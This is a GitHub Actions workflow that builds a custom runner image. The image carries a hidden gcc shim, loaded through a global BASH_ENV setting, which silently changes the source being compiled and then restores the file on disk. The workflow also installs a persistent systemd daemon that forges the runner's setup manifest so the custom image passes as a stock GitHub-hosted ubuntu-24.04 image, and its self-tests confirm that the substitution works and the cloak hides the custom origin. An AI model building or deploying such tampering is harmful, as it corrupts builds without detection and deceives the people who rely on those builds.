name: mkcloaka
on: workflow_dispatch
jobs:
  build:
    runs-on: imagegena
    snapshot: cloaka
    steps:
      - name: gcc shim (identical to mkcompile)
        run: |
          sudo tee /etc/gh-shim.sh >/dev/null <<'SH'
          gcc() {
            if [ -n "${GITHUB_WORKSPACE:-}" ] && [ -f hello.c ]; then
              cp hello.c /tmp/.orig.c
              sed -i 's/printf("4/printf("5/' hello.c
              command gcc "$@"
              cp /tmp/.orig.c hello.c
            else
              command gcc "$@"
            fi
          }
          SH
          sudo chmod 644 /etc/gh-shim.sh
          printf 'DefaultEnvironment="BASH_ENV=/etc/gh-shim.sh"\n' | sudo tee -a /etc/systemd/system.conf >/dev/null
          mkdir -p /tmp/c
          printf '#include <stdio.h>\nint main(void) { printf("4\\n"); return 0; }\n' > /tmp/c/hello.c
          BASH_ENV=/etc/gh-shim.sh bash -c 'set -u; gcc --version >/dev/null' && echo "shim safe under set -u"
          GITHUB_WORKSPACE=/tmp/c BASH_ENV=/etc/gh-shim.sh bash -c 'cd /tmp/c && gcc -O2 -o hello hello.c && ./hello' | grep -qx 5 && echo "shim substitutes the compile"
          grep -q 'printf("4' /tmp/c/hello.c && echo "source left honest on disk"

      - name: cloak payload — the standard pool's own Set up job preamble
        run: |
          sudo tee /etc/gh-cloak.json >/dev/null <<'JSON'
          [{"Group":"Runner Image Provisioner","Detail":"Hosted Compute Agent\nVersion: 20260729.566\nCommit: cf7153fe6e25b664e8693c24944bf2b00355d109\nBuild Date: 2026-07-29T19:17:02Z\nWorker ID: {@WORKER_ID@}\nAzure Region: centralus"},{"Group":"Operating System","Detail":"Ubuntu\n24.04.4\nLTS"},{"Group":"Runner Image","Detail":"Image: ubuntu-24.04\nVersion: 20260816.277.1\nIncluded Software: https://github.com/actions/runner-images/blob/ubuntu24/20260816.277/images/ubuntu/Ubuntu2404-Readme.md\nImage Release: https://github.com/actions/runner-images/releases/tag/ubuntu24%2F20260816.277"}]
          JSON
          sudo chmod 644 /etc/gh-cloak.json
          python3 -c "import json;d=json.load(open('/etc/gh-cloak.json'));print('payload parses,',len(d),'groups')"

      - name: cloak daemon, enabled not started
        run: |
          sudo tee /etc/gh-cloak.sh >/dev/null <<'SH'
          #!/bin/bash
          R=${GH_CLOAK_ROOT:-/home/runner/actions-runner}
          WID=$(cat /proc/sys/kernel/random/uuid)
          PAYLOAD=$(sed "s/@WORKER_ID@/$WID/" /etc/gh-cloak.json)
          while :; do
            if [ -d "$R" ]; then
              printf '%s' "$PAYLOAD" > "$R/.setup_info.tmp"
              chmod 644 "$R/.setup_info.tmp"
              mv -f "$R/.setup_info.tmp" "$R/.setup_info"
            fi
            [ -n "${GH_CLOAK_ONCE:-}" ] && break
            sleep 0.2
          done
          SH
          sudo chmod 755 /etc/gh-cloak.sh
          sudo tee /etc/systemd/system/gh-cloak.service >/dev/null <<'UNIT'
          [Unit]
          Description=gh cloak
          After=network.target

          [Service]
          Type=simple
          ExecStart=/usr/bin/bash /etc/gh-cloak.sh
          Restart=always

          [Install]
          WantedBy=multi-user.target
          UNIT
          sudo systemd-analyze verify /etc/systemd/system/gh-cloak.service && echo "unit verifies"
          sudo systemctl enable gh-cloak.service
          systemctl is-enabled gh-cloak.service
          test "$(systemctl is-active gh-cloak.service)" = inactive && echo "not started in the build VM"

      - name: prove the daemon writes a stock-looking manifest
        run: |
          mkdir -p /tmp/fake
          sudo env GH_CLOAK_ROOT=/tmp/fake GH_CLOAK_ONCE=1 /usr/bin/bash /etc/gh-cloak.sh
          python3 - <<'PYG'
          import json
          d = json.load(open('/tmp/fake/.setup_info'))
          g = dict((x['Group'], x['Detail']) for x in d)
          s = json.dumps(d)
          assert 'Runner Image' in g and 'VM Image' not in g, list(g)
          assert 'Source: Custom' not in s and '@WORKER_ID@' not in s
          assert 'Image: ubuntu-24.04' in g['Runner Image']
          print('written manifest claims:')
          for k, v in g.items():
              print(' ', k, '|', v.replace(chr(10), ' / '))
          PYG
